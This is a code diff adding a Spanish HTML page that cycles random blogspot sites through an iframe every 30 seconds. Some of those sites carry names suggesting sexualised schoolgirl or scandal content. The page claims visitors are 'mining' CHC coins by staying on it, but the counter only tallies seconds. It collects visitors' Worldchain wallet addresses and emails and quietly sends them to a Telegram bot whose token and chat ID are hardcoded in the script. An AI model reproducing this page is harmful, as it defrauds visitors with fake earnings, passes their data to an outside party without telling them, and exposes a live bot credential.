@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirección Aleatoria</title>
+  <style>
+    body {
+      text-align: center;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+    }
+    #iframeContainer {
+      width: 100%;
+      height: 500px;
+      border: 2px solid #ccc;
+      margin-top: 20px;
+      overflow: hidden;
+      border-radius: 10px;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+    #resultado {
+      margin-top: 20px;
+    }
+    input, button {
+      margin: 10px;
+      padding: 10px;
+      width: 80%;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Redirección de Blogs en Ventana Interna</h2>
+<div id="iframeContainer">
+  <iframe id="iframeRedireccion" src=""></iframe>
+</div>
+
+<!-- Caja para ingresar billetera y correo -->
+<div id="usuario-info">
+  <input type="text" id="wallet" placeholder="Introduce tu billetera Worldchain" />
+  <input type="email" id="correo" placeholder="Introduce tu correo" />
+  <button onclick="guardarDatos()">Guardar Datos</button>
+</div>
+
+<button onclick="pararMineria()">Parar Minería</button>
+
+<script>
+  let tiempoTotal = 0;
+  let interval;
+  let minando = true;
+
+  // Token y chat ID de Telegram
+  const telegramToken = '8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk';
+  const chatId = '7613604212';
+
+  // Lista de blogs para redireccionar
+  const urls = [
+    "https://notiiciasmex.blogspot.com",
+    "https://tareasunamyunadm.blogspot.com",
+    "https://faucentminialtcrypto.blogspot.com",
+    "https://solotareasmex.blogspot.com",
+    "https://colegialas-calientes-69.blogspot.com",
+    "https://colegialas14defebrero.blogspot.com",
+    "https://joseperez69.blogspot.com",
+    "https://mundogamermejico.blogspot.com",
+    "https://backtrackingchesscaso.blogspot.com",
+    "https://games2015steamyorigin.blogspot.com", 
+    "https://videoescandalosmex.blogspot.com",
+    "https://basededatosunadm.blogspot.com",
+    "https://gmcas77.blogspot.com",
+    "https://basededatostareas.blogspot.com"
+  ];
+
+  // Redireccionar a una URL dentro del iframe
+  function redireccionAleatoria() {
+    const indiceAleatorio = Math.floor(Math.random() * urls.length);
+    const urlRedireccion = urls[indiceAleatorio];
+
+    document.getElementById('iframeRedireccion').src = urlRedireccion;
+
+    setTimeout(redireccionAleatoria, 30000); // Redirige cada 30 segundos
+  }
+
+  // Llamar a la redirección inicial
+  redireccionAleatoria();
+
+   // Función para guardar datos
+  function guardarDatos() {
+    const wallet = document.getElementById('wallet').value;
+    const correo = document.getElementById('correo').value;
+
+    if (!wallet || !correo) {
+      alert('Por favor, completa todos los campos.');
+      return;
+    }
+
+    console.log(`Billetera: ${wallet}, Correo: ${correo}`);
+    alert('Datos guardados correctamente.');
+
+    // Enviar a Telegram
+    enviarMensajeTelegram(`Datos Guardados:\nBilletera: ${wallet}\nCorreo: ${correo}`);
+  }
+
+  // Función para detener minería
+  function pararMineria() {
+    clearInterval(interval);
+    minando = false;
+    alert(`Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
+    enviarMensajeTelegram(`Minería detenida. Ganancia: ${tiempoTotal} CHC`);
+  }
+
+  // Función para contar el tiempo en la página
+  function contarTiempo() {
+    if (minando) {
+      tiempoTotal++;
+      if (tiempoTotal % 100 === 0) {
+        alert(`¡Has ganado 100 CHC!`);
+        enviarMensajeTelegram(`¡Usuario ha ganado 100 CHC!`);
+      }
+    }
+  }
+
+  // Inicia el conteo cada segundo
+  interval = setInterval(contarTiempo, 1000);
+
+  // Función para enviar mensajes a Telegram
+  function enviarMensajeTelegram(mensaje) {
+    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: mensaje
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log('Mensaje enviado a Telegram:', mensaje);
+      } else {
+        console.error('Error al enviar mensaje:', data);
+      }
+    })
+    .catch(error => {
+      console.error('Error en la solicitud a Telegram:', error);
+    });
+  }
+</script>
+
+</body>
+</html>
